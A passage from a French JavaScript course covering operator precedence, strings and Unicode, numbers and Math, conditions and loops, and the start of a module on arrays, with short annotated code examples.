9. `&`, puis `^`, puis `|`
10. `&&`, puis `||` et `??`
11. Ternaire `? :`, affectations, `...`, virgule

> **Règle absolue** : en cas de doute, **mettez des parenthèses**. Et on ne peut pas mélanger `??` avec `&&` ou `||` sans parenthèses : `a ?? b || c` est une `SyntaxError`, il faut écrire `(a ?? b) || c`.

### 4.13 Bonnes pratiques

- Toujours `===` et `!==`.
- Préférer `??` à `||` quand `0`, `''` ou `false` sont des valeurs valides.
- Limiter les ternaires imbriqués et les effets de bord dans les expressions (`a[i++] = b[--j]`).
- Parenthéser les expressions mixtes pour exprimer l'intention.

### Points clés du module 4

- `&&` et `||` renvoient un opérande et court-circuitent ; `??` ne réagit qu'à `null` et `undefined`.
- `?.` évite les erreurs sur chaînes de propriétés potentiellement absentes.
- `%` est un reste (signe du dividende) ; `**` est associatif à droite.
- Les opérateurs bit à bit travaillent sur 32 bits.

## 5. Chaînes de caractères

### 5.1 Déclarer des chaînes

Une **chaîne** est une suite **immuable** d'unités de code **UTF-16**. Trois syntaxes de littéraux :

```javascript
const s1 = 'simple';
const s2 = "double";               // équivalent à s1 : seul le choix des guillemets diffère
const s3 = `gabarit`;              // template literal (backticks)
console.log(s1, s2, s3);

const nom = 'Alice';
console.log(`Bonjour ${nom}, 2 + 3 = ${2 + 3}`);   // interpolation : toute expression est permise

const multi = `Ligne 1
Ligne 2`;                           // chaîne multiligne
console.log(multi);
```

Seul le **gabarit** (backticks) autorise l'interpolation `${...}` et les sauts de ligne littéraux.

#### Séquences d'échappement

| Séquence | Signification |
| --- | --- |
| `\n` | Saut de ligne |
| `\t` | Tabulation |
| `\\` | Antislash |
| `\'` et `\"` | Guillemets |
| `\u00E9` | Caractère Unicode sur 4 chiffres hexadécimaux (`é`) |
| `\u{1F600}` | Point de code Unicode quelconque (un smiley) |
| `\xE9` | Caractère sur 2 chiffres hexadécimaux |

`String.raw` ignore les échappements : `String.raw`C:\\dossier\\nouveau\`\` renvoie le texte tel quel, utile pour les chemins et les expressions régulières.

#### Gabarits étiquetés

Une fonction placée devant un gabarit le reçoit **découpé** : un tableau de fragments de texte et les valeurs interpolées. Cela sert à échapper du HTML, à formater, à construire des requêtes paramétrées, à internationaliser.

```javascript
function surligner(chaines, ...valeurs) {
    return chaines.reduce((r, c, i) => r + c + (valeurs[i] !== undefined ? `<b>${valeurs[i]}</b>` : ''), '');
}
console.log(surligner`Bonjour ${'Alice'}, vous avez ${3} messages`);
// 'Bonjour <b>Alice</b>, vous avez <b>3</b> messages'
```

### 5.2 Propriétés, accès et immutabilité

```javascript
const s = 'JavaScript';
console.log(s.length);    // 10
console.log(s[0]);        // 'J'
console.log(s.at(-1));    // 't' : accès depuis la fin (ES2022)
console.log(s[99]);       // undefined : pas d'erreur hors limites

(function () {
    'use strict';
    try {
        s[0] = 'j';           // erreur en mode strict : les chaînes sont immuables
    } catch (e) {
        console.error(e.name);   // TypeError
    }
})();
console.log(s);           // 'JavaScript' : inchangée
```

Toute méthode de chaîne **renvoie une nouvelle chaîne** ; l'original n'est jamais modifié.

### 5.3 Unicode : unités UTF-16, points de code et graphèmes

`length` compte des **unités UTF-16**, pas des caractères visibles. Les caractères hors du plan de base (emojis, certains idéogrammes) occupent **deux unités** (une *paire de substitution*). Trois niveaux à distinguer :

| Niveau | Exemple | Comment le compter |
| --- | --- | --- |
| Unité UTF-16 | moitiés d'un emoji | `s.length`, `s.charCodeAt(i)` |
| Point de code | un emoji entier | `[...s].length`, `s.codePointAt(i)` |
| Graphème (ce que l'œil voit) | `é` en 2 points de code, drapeaux, familles d'emojis | `Intl.Segmenter` |

```javascript
const emoji = '😀';
console.log(emoji.length);            // 2
console.log([...emoji].length);       // 1
console.log(emoji.codePointAt(0));    // 128512
console.log(String.fromCodePoint(128512));   // '😀'

const e1 = '\u00E9';                   // é en un seul point de code
const e2 = 'e\u0301';                 // e + accent combinant : s'affiche pareil
console.log(e1 === e2);               // false
console.log(e1 === e2.normalize('NFC'));   // true : normalisation Unicode

const segmenteur = new Intl.Segmenter('fr', { granularity: 'grapheme' });
console.log([...segmenteur.segment('👨‍👩‍👧 é')].length);   // nombre de graphèmes visibles
```

Formes de normalisation : **NFC** (composée, la plus utilisée), **NFD** (décomposée), **NFKC** / **NFKD** (compatibilité). Normalisez avant de comparer des textes saisis par l'utilisateur. `isWellFormed()` (ES2024) vérifie qu'une chaîne ne contient pas de moitié de substitution isolée ; `toWellFormed()` les remplace par le caractère de remplacement `U+FFFD`.

### 5.4 Méthodes principales

| Méthode | Rôle |
| --- | --- |
| `toUpperCase()` / `toLowerCase()` | Change la casse (`toLocaleUpperCase('tr')` pour une langue précise) |
| `trim()` / `trimStart()` / `trimEnd()` | Supprime les espaces en bordure |
| `slice(début, fin)` | Sous-chaîne ; accepte des indices négatifs (depuis la fin) |
| `substring(début, fin)` | Sous-chaîne ; pas de négatifs, inverse les bornes si nécessaire |
| `indexOf()` / `lastIndexOf()` | Position (ou `-1`) |
| `includes()` / `startsWith()` / `endsWith()` | Tests booléens |
| `replace()` / `replaceAll()` | Remplace la première occurrence / toutes |
| `split(sép, limite)` | Découpe en tableau |
| `repeat(n)` | Répète |
| `padStart()` / `padEnd()` | Complète jusqu'à une longueur |
| `charAt()` / `charCodeAt()` / `codePointAt()` | Caractère / code |
| `at(i)` | Caractère (négatifs acceptés) |
| `localeCompare()` | Comparaison selon la langue |
| `normalize()` | Normalisation Unicode |
| `match()` / `matchAll()` / `search()` | Expressions régulières (module 11) |
| `isWellFormed()` / `toWellFormed()` | Validité Unicode (ES2024) |

```javascript
console.log('  Bonjour  '.trim());                 // 'Bonjour'
console.log('abcdef'.slice(1, 3));                 // 'bc'
console.log('abcdef'.slice(-2));                   // 'ef'
console.log('abcdef'.substring(3, 1));             // 'bc' : bornes inversées automatiquement
console.log('a-b-c'.replaceAll('-', '+'));         // 'a+b+c'
console.log('a,b,,c'.split(','));                  // ['a', 'b', '', 'c']
console.log('abc'.split(''));                      // ['a', 'b', 'c']
console.log('5'.padStart(3, '0'), 'ab'.padEnd(5, '.'));   // '005' 'ab...'
console.log('ab'.repeat(3));                       // 'ababab'
console.log([...'héllo'].length);                  // 5

// Mettre en majuscule la première lettre
const capitaliser = (t) => t.charAt(0).toUpperCase() + t.slice(1);
console.log(capitaliser('bonjour'));               // 'Bonjour'
```

#### `replace` avec une fonction ou des motifs spéciaux

```javascript
console.log('a1b2'.replace(/\d/g, (chiffre) => chiffre * 2));   // 'a2b4' : la fonction reçoit chaque correspondance
console.log('Alice Dupont'.replace(/(\w+) (\w+)/, '$2 $1'));      // 'Dupont Alice' : $1, $2 = groupes
console.log('prix'.replace('prix', '[$&]'));                       // '[prix]' : $& = la correspondance
```

Avec une **chaîne** comme motif, `replace` ne remplace que la **première** occurrence ; utilisez `replaceAll` ou une regex avec le drapeau `g`. La méthode obsolète `substr()` ne doit plus être utilisée.

### 5.5 Comparer et trier des textes

La comparaison `<` / `>` suit l'ordre des codes Unicode : `'é' > 'z'`. Pour un tri conforme à la langue, utilisez `localeCompare` ou `Intl.Collator` (plus rapide pour de grandes listes).

```javascript
const mots = ['zèbre', 'été', 'arbre', 'Éclair'];
console.log([...mots].sort());                        // ordre des codes : accents et majuscules en fin
console.log([...mots].sort((a, b) => a.localeCompare(b, 'fr')));   // ordre alphabétique français
console.log(['a', 'A', 'á'].sort(new Intl.Collator('fr', { sensitivity: 'base' }).compare));
console.log('a'.localeCompare('A', 'fr', { sensitivity: 'base' }));   // 0 : casse et accents ignorés
```

### 5.6 Construire des chaînes efficacement

Pour assembler beaucoup de fragments, accumulez-les dans un **tableau** puis appelez `join` ; les moteurs modernes optimisent aussi `+=`, mais `join` exprime mieux l'intention.

```javascript
const lignes = [];
for (let i = 1; i <= 3; i++) lignes.push(`Ligne ${i}`);
console.log(lignes.join('\n'));
console.log(['a', 'b', 'c'].join('-'));   // 'a-b-c'
```

### 5.7 Bonnes pratiques

- Préférez les **gabarits** à la concaténation avec `+`.
- Pour comparer des textes accentués : `localeCompare`, `Intl.Collator`, et `normalize()`.
- Ne supposez pas qu'un « caractère » vaut une unité : utilisez l'itération (`for...of`, `[...s]`) ou `Intl.Segmenter`.
- Ne construisez jamais du HTML ou du SQL en concaténant des saisies utilisateur (injection) : échappez ou utilisez des requêtes paramétrées.

### Points clés du module 5

- Les chaînes sont immuables, en UTF-16 ; `length` compte des unités, pas des graphèmes.
- Les gabarits permettent interpolation, multiligne et gabarits étiquetés.
- `slice` est la méthode d'extraction à privilégier ; `replaceAll` ou regex `g` pour remplacer partout.
- Tri et comparaison linguistiques : `localeCompare` / `Intl.Collator`.

## 6. Nombres et `Math`

### 6.1 Le type `number`

Tous les nombres ordinaires (entiers et décimaux) sont des **flottants IEEE 754 sur 64 bits** : 1 bit de signe, 11 d'exposant, 52 de mantisse. Il n'existe pas de type entier distinct (hors `BigInt`).

```javascript
const entier = 42;
const decimal = 3.14;
const grand = 1_000_000;        // séparateurs de lisibilité (ignorés)
const hexa = 0xff;              // 255
const bin = 0b1010;             // 10
const oct = 0o17;               // 15
const sci = 1.5e3;              // 1500
console.log(entier, decimal, grand, hexa, bin, oct, sci);
```

#### Valeurs spéciales

- **`NaN`** (*Not a Number*) : résultat d'une opération numérique invalide (`0 / 0`, `Number('abc')`). Son type est `number`, et il n'est égal à rien, pas même à lui-même : testez avec `Number.isNaN(x)`.
- **`Infinity`** et **`-Infinity`** : résultats de `1 / 0`, de `-1 / 0` ou d'un dépassement de capacité.
- **`0` et `-0`** : deux zéros distincts ; `0 === -0` est vrai, `Object.is(0, -0)` est faux.

#### Précision des flottants

Beaucoup de décimaux n'ont pas de représentation binaire exacte : c'est comme écrire `1/3` en décimal.

```javascript
console.log(0.1 + 0.2);                                   // 0.30000000000000004
console.log(0.1 + 0.2 === 0.3);                           // false
console.log(Math.abs(0.1 + 0.2 - 0.3) < Number.EPSILON);  // true : comparaison tolérante
console.log((0.1 + 0.2).toFixed(2));                      // '0.30' : renvoie une CHAÎNE
console.log(Number((0.1 + 0.2).toFixed(2)));              // 0.3
console.log(9007199254740992 + 1);                        // 9007199254740992 : au-delà de 2^53, on perd les unités
```

**Pour la monnaie** : calculez en **entiers de centimes** (`1999` pour 19,99 €) puis formatez à l'affichage, ou utilisez `BigInt` / une bibliothèque décimale ; n'additionnez jamais des montants flottants.

### 6.2 Méthodes et propriétés de `Number`

| Élément | Rôle |
| --- | --- |
| `Number.isInteger(x)` | Entier ? |
| `Number.isFinite(x)` / `Number.isNaN(x)` | Tests **stricts** (sans conversion, contrairement aux globaux `isFinite` / `isNaN`) |
| `Number.isSafeInteger(x)` | Entier représentable exactement (de −(2⁵³−1) à 2⁵³−1) ? |
| `Number.parseFloat()` / `Number.parseInt()` | Conversion de chaîne |
| `Number.MAX_SAFE_INTEGER` | 9 007 199 254 740 991 |
| `Number.MAX_VALUE` / `Number.MIN_VALUE` | Plus grand / plus petit positif représentable |
| `Number.EPSILON` | Écart entre 1 et le flottant suivant (≈ 2,2 × 10⁻¹⁶) |
| `x.toFixed(n)` | Notation avec `n` décimales (chaîne) |
| `x.toPrecision(n)` | `n` chiffres significatifs (chaîne) |
| `x.toString(base)` | Conversion en base 2 à 36 |
| `x.toExponential(n)` | Notation scientifique |

```javascript
console.log(Number.isInteger(5.0), Number.isInteger(5.5));   // true false
console.log(Number.isNaN('abc'), isNaN('abc'));               // false true : le global convertit d'abord
console.log((255).toString(16), (255).toString(2));           // 'ff' '11111111'
console.log(parseInt('ff', 16));                              // 255
console.log((1234.5678).toFixed(2), (1234.5678).toPrecision(6));   // '1234.57' '1234.57'
console.log((1.005).toFixed(2));                              // '1.00' : 1.005 est en réalité 1.00499999...
```

### 6.3 `BigInt` : entiers de taille arbitraire

Un `BigInt` s'écrit avec le suffixe `n` ou `BigInt(...)`. Il représente des entiers sans limite de taille mais ne se **mélange pas** avec les `number`.

```javascript
const enorme = 9007199254740993n;       // impossible à représenter exactement en number
console.log(enorme * 2n);               // 18014398509481986n
console.log(BigInt(10) + 5n);           // 15n
console.log(7n / 2n);                   // 3n : division entière (troncature)
console.log(2n ** 100n);                // calcul exact
console.log(5n > 3, 2n == 2, 2n === 2); // true true false : comparaisons possibles, égalité stricte non

try {
    console.log(1n + 1);                // mélange interdit
} catch (e) {
    console.error(e.name);              // TypeError
}
```

Limites : pas de décimaux, pas de `Math.*` (qui attend des `number`), `JSON.stringify` lève une `TypeError` (convertissez en chaîne ou fournissez un *replacer*). Usages : identifiants 64 bits, cryptographie, calculs exacts.

### 6.4 L'objet `Math`

`Math` est un espace de noms de fonctions et constantes (on ne l'instancie pas).

| Méthode | Rôle |
| --- | --- |
| `round()` `floor()` `ceil()` `trunc()` | Arrondis : au plus proche / vers −∞ / vers +∞ / vers 0 |
| `abs()` `sign()` | Valeur absolue, signe (−1, 0, 1) |
| `max(...)` `min(...)` | Extrêmes (`Math.max()` sans argument vaut `-Infinity`) |
| `pow()` `sqrt()` `cbrt()` `hypot()` | Puissances et racines |
| `random()` | Flottant pseudo-aléatoire dans \[0 ; 1\[ |
| `sin()` `cos()` `tan()` `atan2()`… | Trigonométrie (angles en **radians**) |
| `log()` `log2()` `log10()` `exp()` | Logarithmes et exponentielle |
| `PI` `E` | Constantes |
| `sumPrecise(itérable)` | Somme **précise** de nombres *(ES2026)* |

```javascript
console.log(Math.round(2.5), Math.round(-2.5), Math.round(2.4));   // 3 -2 2 : les demis vont vers +∞
console.log(Math.floor(-2.5), Math.ceil(-2.5), Math.trunc(-2.5));  // -3 -2 -2
console.log(Math.max(...[3, 9, 4]), Math.min(3, 9, 4));            // 9 3
console.log(Math.hypot(3, 4));                                     // 5
console.log(Math.sin(Math.PI / 2));                                // 1

// Entier aléatoire dans [min ; max] inclus
const entierAleatoire = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;
console.log(entierAleatoire(1, 6));   // résultat d'un dé

// Arrondir à 2 décimales
const arrondir = (x, n = 2) => Math.round((x + Number.EPSILON) * 10 ** n) / 10 ** n;
console.log(arrondir(1.005));         // 1.01
```

> **Sécurité** : `Math.random()` n'est **pas cryptographiquement sûr** (prévisible). Pour jetons, mots de passe ou identifiants sensibles, utilisez `crypto.getRandomValues()` ou `crypto.randomUUID()`.

### 6.5 Formater les nombres avec `Intl.NumberFormat`

`Intl.NumberFormat` (et `Number.prototype.toLocaleString`) formate selon la **langue** : séparateurs, symboles monétaires, pourcentages, unités.

```javascript
const eur = new Intl.NumberFormat('fr-FR', { style: 'currency', currency: 'EUR' });
console.log(eur.format(1234.5));                                   // '1 234,50 €'
console.log(new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD' }).format(1234.5));   // '$1,234.50'
console.log(new Intl.NumberFormat('fr-FR', { style: 'percent' }).format(0.256));                       // '26 %'
console.log(new Intl.NumberFormat('fr-FR', { notation: 'compact' }).format(1_250_000));                // '1,3 M'
console.log(new Intl.NumberFormat('fr-FR', { style: 'unit', unit: 'kilometer-per-hour' }).format(90)); // '90 km/h'
console.log(new Intl.NumberFormat('fr-FR', { minimumFractionDigits: 2, maximumFractionDigits: 2 }).format(3));   // '3,00'
console.log((1234567.891).toLocaleString('fr-FR'));               // '1 234 567,891'
```

Pour de nombreux appels, **créez le formateur une seule fois** et réutilisez-le : la construction coûte plus cher que `format`.

### 6.6 Bonnes pratiques

- Ne comparez jamais des flottants avec `===` après un calcul : utilisez une tolérance.
- Argent : entiers de centimes ou bibliothèque décimale ; formatage seulement à l'affichage.
- Utilisez `Number.isNaN` / `Number.isFinite` plutôt que les globaux.
- Gardez `Number.isSafeInteger` en tête pour les identifiants numériques ; basculez en `BigInt` ou en chaînes au-delà de 2⁵³.
- Indiquez toujours la base en lecture : `parseInt(texte, 10)`.

### Points clés du module 6

- Un seul type numérique (flottant 64 bits) + `BigInt` pour les grands entiers.
- `0.1 + 0.2 !== 0.3` : c'est la nature des flottants, pas un bug de JavaScript.
- `toFixed` renvoie une chaîne ; `Math.round` arrondit les demis vers +∞.
- `Intl.NumberFormat` gère devises, pourcentages et unités selon la langue.

## 7. Conditions et boucles

### 7.1 Les structures conditionnelles

Une **condition** oriente l'exécution selon qu'une expression est *truthy* ou *falsy* (module 3). L'expression n'a pas besoin d'être un booléen : le moteur la convertit.

```javascript
const note = 14;

if (note >= 16) {
    console.log('Très bien');
} else if (note >= 10) {
    console.log('Passable');      // affiché pour 14
} else {
    console.log('Insuffisant');
}

const nom = '';
if (!nom) console.log('Nom manquant');   // '' est falsy
```

Les accolades sont techniquement facultatives pour une seule instruction, mais **gardez-les toujours** : elles évitent des bogues lors d'ajouts ultérieurs.

#### Clauses de garde

Plutôt que d'imbriquer, **sortez tôt** des cas anormaux :

```javascript
function calculerRemise(client) {
    if (!client) return 0;                  // garde 1
    if (!client.actif) return 0;            // garde 2
    return client.fidelite > 5 ? 0.1 : 0.05;   // cas nominal, non imbriqué
}
console.log(calculerRemise({ actif: true, fidelite: 8 }));   // 0.1
```

#### `switch`

`switch` compare une valeur à plusieurs `case` avec **`===`**. Sans `break`, l'exécution **continue** dans le `case` suivant (*fall-through*), ce qui est parfois volontaire pour regrouper des cas.

```javascript
const jour = 'dimanche';

switch (jour) {
    case 'samedi':
    case 'dimanche':               // fall-through volontaire : deux cas, un traitement
        console.log('Week-end');   // affiché
        break;
    case 'vendredi': {             // accolades : portée de bloc pour les let/const
        const message = 'Presque !';
        console.log(message);
        break;
    }
    default:
        console.log('Semaine');
}

// Motif switch (true) : conditions de plage
const temperature = 22;
switch (true) {
    case temperature < 10: console.log('Froid'); break;
    case temperature < 25: console.log('Doux'); break;   // affiché
    default: console.log('Chaud');
}
```

#### Opérateurs conditionnels et tables de correspondance

Le ternaire et les opérateurs logiques (module 4) conviennent aux cas simples. Pour de nombreuses branches associées à des **clés fixes**, une table de correspondance est plus lisible et extensible :

```javascript
const ajouter = () => console.log('Ajout');
const supprimer = () => console.log('Suppression');
const commande = 'ajouter';

const actions = { ajouter, supprimer };
actions[commande]?.();      // 'Ajout'
actions.inconnue?.();       // rien : la commande n'existe pas
```

### 7.2 Les boucles

Une **boucle** répète un bloc tant qu'une condition est vraie ou pour chaque élément d'une collection.

| Boucle | Usage |
| --- | --- |
| `for` | Nombre d'itérations connu, besoin d'un indice |
| `while` | Tant qu'une condition est vraie (testée **avant**) |
| `do...while` | Au moins une exécution (condition testée **après**) |
| `for...of` | **Valeurs** d'un itérable (tableau, chaîne, `Map`, `Set`, générateur) : à privilégier |
| `for...in` | **Clés** énumérables d'un objet (héritées comprises) : à éviter sur les tableaux |
| `for await...of` | Itérables asynchrones (module 13) |

#### `for`

Trois parties : **initialisation**, **condition**, **incrément**, chacune facultative.

```javascript
for (let i = 0; i < 3; i++) console.log(i);   // 0 1 2

// Parcours à rebours
for (let i = 4; i >= 0; i -= 2) console.log(i);   // 4 2 0

// Parties omises (équivaut à while(true)) : sortie par break
let k = 0;
for (;;) { if (++k > 2) break; }
console.log(k);   // 3
```

Avec `let`, **une nouvelle variable est créée à chaque itération** : les fermetures créées dans la boucle capturent donc chacune leur propre valeur (voir le module 12).

#### `while` et `do...while`

```javascript
let n = 0;
while (n < 3) { n++; }
console.log(n);                // 3

do { n--; } while (n > 0);     // s'exécute au moins une fois
console.log(n);                // 0
```

Veillez à ce que la condition **évolue** : sinon la boucle est infinie et bloque la page ou le processus.

#### `for...of` : les valeurs

```javascript
for (const fruit of ['pomme', 'banane']) console.log(fruit);
for (const lettre of 'été') console.log(lettre);              // itère par points de code
for (const [indice, fruit] of ['a', 'b'].entries()) console.log(indice, fruit);
for (const [cle, valeur] of Object.entries({ a: 1, b: 2 })) console.log(cle, valeur);
for (const [nom, note] of new Map([['Alice', 15]])) console.log(nom, note);
```

#### `for...in` : les clés

`for...in` parcourt les propriétés **énumérables**, y compris celles **héritées** du prototype, et fournit des **chaînes** (même pour des indices de tableau) dans un ordre peu intuitif pour les clés numériques.

```javascript
for (const cle in { x: 1, y: 2 }) console.log(cle);   // 'x' 'y'

const tab = ['a', 'b'];
tab.extra = 'piège';
for (const i in tab) console.log(i, typeof i);        // '0' '1' 'extra' : toutes de type string
```

Pour un objet, préférez `Object.keys`, `Object.values` ou `Object.entries` avec `for...of`.

#### `forEach` et méthodes de tableau

`tableau.forEach(fn)` appelle une fonction par élément, mais on ne peut ni utiliser `break` / `continue`, ni **attendre** (`await`) de façon séquentielle à l'intérieur. Quand il faut interrompre, utilisez `for...of`, `some` ou `every`.

### 7.3 Contrôler le déroulement : `break`, `continue`, étiquettes

```javascript
for (let i = 0; i < 10; i++) {
    if (i === 3) continue;     // passe à l'itération suivante
    if (i === 6) break;        // quitte la boucle
    console.log(i);            // 0 1 2 4 5
}

externe: for (let i = 0; i < 3; i++) {
    for (let j = 0; j < 3; j++) {
        if (j === 1) continue externe;   // reprend la boucle externe
        console.log(i, j);               // 0 0, 1 0, 2 0
    }
}
```

Une **étiquette** nomme une boucle ou un bloc ; `break étiquette` permet de sortir de plusieurs niveaux d'imbrication. Utilisez-la rarement : une fonction avec `return` est généralement plus claire.

### 7.4 Boucles et asynchronisme

```javascript
const attendre = (ms) => new Promise((r) => setTimeout(r, ms));

(async () => {
    // Séquentiel : chaque itération attend la précédente
    for (const n of [1, 2, 3]) {
        await attendre(100);
        console.log('séquentiel', n);
    }
    // Parallèle : toutes démarrent en même temps
    const resultats = await Promise.all([1, 2, 3].map(async (n) => { await attendre(100); return n * 2; }));
    console.log(resultats);   // [2, 4, 6]
})();
```

> **Attention** : `forEach` **n'attend pas** les `await` de son callback : le programme poursuit sans patienter. Utilisez `for...of` (séquentiel) ou `Promise.all(tableau.map(...))` (parallèle).

### 7.5 Bonnes pratiques et pièges

- Préférez `for...of` et les méthodes de tableau aux `for` indexés.
- Ne modifiez pas une collection pendant qu'on la parcourt (éléments sautés ou boucle infinie).
- Évitez les doubles parcours `O(n²)` sur de grandes données : utilisez un `Set` ou une `Map` pour les recherches.
- Évitez de calculer `tableau.length` coûteux dans la condition si la structure n'est pas un tableau simple.
- Piège : `for (let i = 0; i <= tableau.length; i++)` lit un indice de trop (`undefined`).

### Points clés du module 7

- `if` / `else`, `switch` (`===`, `break`), ternaire et table de correspondance règlent les branchements.
- `for...of` itère les valeurs, `for...in` les clés énumérables (héritées incluses).
- `break`, `continue` et les étiquettes contrôlent le flux ; `forEach` ne les supporte pas.
- En asynchrone : `for...of` + `await` pour le séquentiel, `Promise.all` pour le parallèle.

## 8. Tableaux

### 8.1 Nature d'un tableau

Un **tableau** (`Array`) est un objet spécialisé qui stocke une **liste ordonnée** de valeurs accessibles par **indice** (de `0` à `length - 1`). Il peut mélanger tous les types, grandit et rétrécit dynamiquement, et expose une propriété `length`. C'est un **objet** : il est copié par référence.

```javascript
const fruits = ['pomme', 'banane', 'cerise'];
const vide = [];
const zeros = new Array(3).fill(0);                      // [0, 0, 0]
const suite = Array.from({ length: 5 }, (_, i) => i);    // [0, 1, 2, 3, 4]
const lettres = Array.from('abc');                       // ['a', 'b', 'c']
const mixte = [1, 'deux', { trois: 3 }, [4]];            // types hétérogènes, imbrication
console.log(vide, zeros, suite, lettres, mixte);

console.log(fruits[0]);               // 'pomme'
console.log(fruits.at(-1));           // 'cerise' : accès depuis la fin (ES2022)
console.log(fruits[10]);              // undefined : aucune erreur hors limites
console.log(fruits.length);           // 3
console.log(Array.isArray(fruits));   // true
```

**Pièges de création** : `new Array(3)` crée un tableau de longueur 3 **sans éléments** (des « trous »), tandis que `new Array(3, 4)` crée `[3, 4]` ; préférez les littéraux et `Array.from`/`fill`. `Array.of(3)` crée toujours `[3]`.

#### `length` est modifiable

```javascript
const t = [1, 2, 3, 4];
t.length = 2;                          // tronque : [1, 2]
console.log(t);
t.length = 0;                          // vide le tableau (en conservant la référence)
t[3] = 'x';                            // crée des trous : [empty × 3, 'x']
console.log(t.length);                 // 4
```

Un **tableau creux** (*sparse*) contient des emplacements vides ; `map`, `forEach`, `filter` les **ignorent**. Évitez-les. N'utilisez pas `delete t[i]` (laisse un trou) : employez `splice`.

### 8.2 Ajouter, retirer, modifier

| Méthode | Effet | Mute ? |
| --- | --- | --- |
| `push(x, ...)` / `pop()` | Ajoute / retire à la **fin** (renvoie la nouvelle longueur / l'élément) | Oui |
| `unshift(x)` / `shift()` | Ajoute / retire au **début** | Oui |
| `splice(i, n, ...ajouts)` | Supprime `n` éléments à `i` et insère des éléments ; renvoie les éléments supprimés | Oui |
| `sort()` / `reverse()` | Trie / inverse sur place | Oui |
| `fill(v, début, fin)` / `copyWithin()` | Remplit / copie interne | Oui |
| `slice(début, fin)` | Sous-tableau (fin exclue) | Non |
| `concat()` / `[...a, ...b]` | Assemble | Non |

```javascript
const t = ['a', 'b', 'c', 'd'];
t.push('e');                       // ['a','b','c','d','e']
console.log(t.pop());              // 'e'
t.unshift('z');                    // ['z','a','b','c','d']
console.log(t.shift());            // 'z'
console.log(t.splice(1, 2));       // ['b','c'] supprimés ; t = ['a','d']
t.splice(1, 0, 'x', 'y');          // insertion sans suppression : ['a','x','y','d']
console.log(t);
console.log(t.slice(1, 3));        // ['x','y'] ; t inchangé
console.log(['a'].concat(['b'], 'c'));   // ['a','b','c']
```

`shift` et `unshift` sont plus coûteux que `push` / `pop` car ils décalent tous les éléments : pour une **file** volumineuse, utilisez un indice de lecture ou une structure dédiée.

#### Versions non mutantes (ES2023)

```javascript
const nombres = [3, 1, 2];
console.log(nombres.toSorted());        // [1, 2, 3]
console.log(nombres.toReversed());      // [2, 1, 3]
console.log(nombres.toSpliced(1, 1));   // [3, 2]
console.log(nombres.with(0, 99));       // [99, 1, 2]
console.log(nombres);                   // [3, 1, 2] : inchangé
```

Elles évitent les effets de bord, très utiles avec les états immuables des frameworks.

#### Trier correctement

`sort()` **sans argument** convertit les éléments en **chaînes** et trie par code : `[10, 2, 1].sort()` donne `[1, 10, 2]`. Fournissez une fonction de comparaison `(a, b) => nombre` : négatif (a avant b), positif (b avant a), nul (égaux). Le tri est **stable** (les éléments égaux gardent leur ordre).

```javascript
console.log([10, 2, 1].sort());                  // [1, 10, 2]
console.log([10, 2, 1].sort((a, b) => a - b));   // [1, 2, 10]
console.log([10, 2, 1].sort((a, b) => b - a));   // [10, 2, 1]

const personnes = [{ nom: 'Zoé', age: 30 }, { nom: 'Alice', age: 30 }, { nom: 'Bob', age: 25 }];
// Tri multi-critères : âge puis nom
console.log(personnes.toSorted((a, b) => a.age - b.age || a.nom.localeCompare(b.nom, 'fr')));
```

### 8.3 Parcourir

```javascript
const fruits = ['pomme', 'banane', 'cerise'];
for (const f of fruits) console.log(f);
fruits.forEach((f, i) => console.log(i, f));
for (const [i, f] of fruits.entries()) console.log(i, f);
console.log([...fruits.keys()]);      // [0, 1, 2]
```

### 8.4 Méthodes d'ordre supérieur

Une **méthode d'ordre supérieur** reçoit une **fonction** (callback) en argument. Le callback reçoit `(élément, indice, tableau)`.

```javascript
const nums = [1, 2, 3, 4, 5];

console.log(nums.map(x => x * 2));                      // [2, 4, 6, 8, 10] : transforme chaque élément
console.log(nums.filter(x => x % 2 === 0));             // [2, 4] : garde ceux qui satisfont le test
console.log(nums.reduce((somme, x) => somme + x, 0));   // 15 : réduit à une seule valeur
console.log(nums.find(x => x > 2));                     // 3 : premier trouvé (ou undefined)
console.log(nums.findIndex(x => x > 2));                // 2 (ou -1)
console.log(nums.findLast(x => x < 5));                 // 4 : depuis la fin (ES2023)
console.log(nums.findLastIndex(x => x < 0));            // -1
console.log(nums.some(x => x > 4));                     // true : au moins un
console.log(nums.every(x => x > 0));                    // true : tous
console.log(nums.flatMap(x => [x, x * 10]).length);     // 10 : map puis aplatit d'un niveau
console.log([[1, [2]], [3]].flat(Infinity));            // [1, 2, 3]
```

#### `reduce` en détail

`reduce((accumulateur, élément) => nouvelAccumulateur, valeurInitiale)`. **Fournissez toujours la valeur initiale** : sans elle, le premier élément sert d'accumulateur et un tableau vide lève une `TypeError`.

```javascript
const achats = [{ produit: 'pain', prix: 2 }, { produit: 'lait', prix: 1.5 }, { produit: 'pain', prix: 2 }];

const total = achats.reduce((s, a) => s + a.prix, 0);
console.log(total);   // 5.5

const comptes = achats.reduce((acc, a) => {        // dénombrement par clé
    acc[a.produit] = (acc[a.produit] ?? 0) + 1;
    return acc;
}, {});
console.log(comptes);   // { pain: 2, lait: 1 }
```

**Piège classique** : `['1', '2', '3'].map(parseInt)` donne `[1, NaN, NaN]`, car `map` passe l'indice comme 2ᵉ argument (la base de `parseInt`). Écrivez `.map(x => parseInt(x, 10))` ou `.map(Number)`.

#### Rechercher

```javascript
const fruits = ['pomme', 'banane', 'cerise'];
console.log(fruits.includes('pomme'));   // true
console.log(fruits.indexOf('banane'));   // 1
console.log(fruits.indexOf('kiwi'));     // -1 : absent
console.log([NaN].includes(NaN), [NaN].indexOf(NaN));   // true -1 : includes gère NaN
```

#### Regrouper (ES2024) et créer

```javascript
const personnes = [{ nom: 'A', age: 20 }, { nom: 'B', age: 30 }, { nom: 'C', age: 20 }];
console.log(Object.groupBy(personnes, p => p.age));   // { 20: [A, C], 30: [B] }
console.log(Map.groupBy(personnes, p => p.age));      // même chose, sous forme de Map (clés de tout type)

async function* nombres() { yield 1; yield 2; yield 3; }
Array.fromAsync(nombres()).then(console.log);         // [1, 2, 3] : Array.from pour itérables asynchrones (ES2026)
console.log(['a', 'b'].join(', '));                   // 'a, b'
```

### 8.5 Copier, spread, rest et décomposition

```javascript
const a = [1, 2];
const b = [...a, 3, 4];                // nouvelle copie + ajouts (superficielle)
console.log(b);                        // [1, 2, 3, 4]
console.log(Math.max(...b));           // 4 : spread dans un appel
const [premier, ...autres] = b;        // décomposition + reste
console.log(premier, autres);          // 1 [2, 3, 4]

const matrice = [[1], [2]];
const copieSup = [...matrice];
